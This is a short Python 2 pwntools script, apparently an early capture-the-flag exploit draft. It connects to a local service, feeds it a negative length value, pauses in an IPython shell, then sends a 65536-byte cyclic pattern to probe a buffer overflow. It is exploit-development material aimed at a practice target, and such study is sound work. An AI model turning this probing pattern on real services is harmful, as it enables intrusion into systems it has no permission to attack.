#!/usr/bin/env python2

from pwn import *
from IPython import embed

r = remote('127.0.0.1', 7122)

r.recvuntil('?')
r.sendline('asdf')
r.recvuntil('N:')
r.sendline('Y')
r.recvuntil(':')
r.sendline('-1')
embed()
r.sendline(cyclic(65536))
r.interactive()
